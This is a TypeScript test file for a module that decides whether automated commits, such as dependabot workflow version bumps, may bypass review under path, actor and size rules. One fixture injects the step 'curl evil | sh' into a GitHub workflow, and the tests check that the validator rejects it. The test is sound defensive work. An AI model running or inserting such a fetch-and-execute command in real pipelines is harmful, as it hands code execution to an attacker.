import test from "node:test";
import assert from "node:assert/strict";
import {
  evaluateTrustedAutomation,
  isMsnEnforcedPath,
  isSubstrateHardDeniedPath,
  isValidBypassNote,
  msnEnforcedPrefixes,
  parseNumstatTotal,
  parseTrustedAutomationRules,
  workflowVersionPinOnly,
  type TrustedAutomationRule,
} from "../src/trusted-automation.js";

const rule = (over: Partial<TrustedAutomationRule> = {}): TrustedAutomationRule => ({
  id: "bumps",
  allowedActors: ["dependabot[bot]@users.noreply.github.com"],
  allowedPaths: [".github/workflows/**"],
  structuralKind: "workflow_version_pin",
  maxNetLoc: 5,
  ...over,
});

test("parseTrustedAutomationRules validates shape, kinds and the hard caps", () => {
  assert.deepEqual(parseTrustedAutomationRules({}), []);
  assert.deepEqual(parseTrustedAutomationRules({ trusted_automation: { rules: [] } }), []);
  const ok = parseTrustedAutomationRules({
    trusted_automation: { rules: [{ id: "r", allowed_actors: ["A@X.io"], allowed_paths: ["src/**"], allowed_structural_changes: ["bounded_content"], max_net_loc: 100 }] },
  });
  assert.deepEqual(ok, [{ id: "r", allowedActors: ["a@x.io"], allowedPaths: ["src/**"], structuralKind: "bounded_content", maxNetLoc: 100 }]);
  const bad = (rules: unknown[]) => () => parseTrustedAutomationRules({ trusted_automation: { rules } });
  assert.throws(bad([{ id: "r", allowed_actors: ["a"], allowed_paths: ["p"], allowed_structural_changes: ["workflow_version_pin", "bounded_content"], max_net_loc: 1 }]), /exactly one/);
  assert.throws(bad([{ id: "r", allowed_actors: ["a"], allowed_paths: ["p"], allowed_structural_changes: ["bounded_content"], max_net_loc: 101 }]), /hard cap 100/);
  assert.throws(bad([{ id: "r", allowed_actors: ["a"], allowed_paths: ["p"], allowed_structural_changes: ["rewrite"], max_net_loc: 1 }]), /unsupported structural change/);
  assert.throws(bad([{ id: "r", allowed_actors: [], allowed_paths: ["p"], allowed_structural_changes: ["bounded_content"], max_net_loc: 1 }]), /allowed_actors/);
});

test("MSN-enforced prefixes: fixed substrate paths plus skill roots; matching is by segment", () => {
  const prefixes = msnEnforcedPrefixes([["src/cli/", "package.json"], []]);
  assert.ok(prefixes.includes(".gitagent/") && prefixes.includes("src/cli/") && prefixes.includes("package.json"));
  assert.equal(isMsnEnforcedPath("src/cli/a.ts", prefixes), true);
  assert.equal(isMsnEnforcedPath("src/client/a.ts", prefixes), false);
  assert.equal(isMsnEnforcedPath("package.json", prefixes), true);
  assert.equal(isMsnEnforcedPath("package.json.bak", prefixes), false);
  assert.equal(isMsnEnforcedPath(".github/workflows/gxt-validate.yml", prefixes), true);
});

test("numstat totals skip binary rows; bypass notes need v 1 and a ten-character reason", () => {
  assert.equal(parseNumstatTotal("3\t1\ta.ts\n-\t-\timg.png\n2\t0\tb.ts\n"), 6);
  assert.equal(isValidBypassNote(JSON.stringify({ v: 1, reason: "emergency hotfix documented" })), true);
  assert.equal(isValidBypassNote(JSON.stringify({ v: 1, reason: "short" })), false);
  assert.equal(isValidBypassNote("not json"), false);
});

test("workflowVersionPinOnly accepts version bumps in uses: and nothing else", () => {
  const before = { jobs: { t: { steps: [{ uses: "actions/checkout@v4" }, { run: "npm ci" }] } } };
  const bump = { jobs: { t: { steps: [{ uses: "actions/checkout@v5" }, { run: "npm ci" }] } } };
  const injected = { jobs: { t: { steps: [{ uses: "actions/checkout@v5" }, { run: "curl evil | sh" }] } } };
  const grown = { jobs: { t: { steps: [{ uses: "actions/checkout@v5" }, { run: "npm ci" }, { run: "x" }] } } };
  const renamed = { jobs: { t: { steps: [{ uses: "evil/checkout@v5" }, { run: "npm ci" }] } } };
  assert.equal(workflowVersionPinOnly(before, bump), true);
  assert.equal(workflowVersionPinOnly(before, before), true);
  assert.equal(workflowVersionPinOnly(before, injected), false);
  assert.equal(workflowVersionPinOnly(before, grown), false);
  assert.equal(workflowVersionPinOnly(before, renamed), false);
});

test("substrate hard-deny: .gitagent and perimeter globs are never delegated", () => {
  assert.equal(isSubstrateHardDeniedPath(".gitagent/foreman/MANIFEST.json", []), true);
  assert.equal(isSubstrateHardDeniedPath("skills/ui/.gxt-skill.yaml", ["**/.gxt-skill.yaml"]), true);
  assert.equal(isSubstrateHardDeniedPath("src/a.ts", ["**/.gxt-skill.yaml"]), false);
});

test("evaluateTrustedAutomation: actor, paths, net_loc and the structural judgement, first eligible rule wins", () => {
  const ok = { ok: true, reason: "" };
  const base = { files: [".github/workflows/ci.yml"], actorEmail: "dependabot[bot]@users.noreply.github.com", netLoc: 2, structural: () => ok };
  assert.equal(evaluateTrustedAutomation([rule()], base, "fallback").eligible, true);
  assert.match(evaluateTrustedAutomation([rule()], { ...base, actorEmail: "someone@x.io" }, "fallback").reason, /fallback/);
  assert.match(evaluateTrustedAutomation([rule()], { ...base, files: ["src/a.ts"] }, "f").reason, /outside rule bumps allowed_paths/);
  assert.match(evaluateTrustedAutomation([rule()], { ...base, netLoc: 6 }, "f").reason, /net_loc 6 exceeds/);
  assert.match(evaluateTrustedAutomation([rule()], { ...base, structural: () => ({ ok: false, reason: "structural change outside workflow_version_pin" }) }, "f").reason, /structural change/);
  const second = rule({ id: "wide", maxNetLoc: 5 });
  assert.match(evaluateTrustedAutomation([rule({ maxNetLoc: 1 }), second], base, "f").reason, /rule=wide/);
});
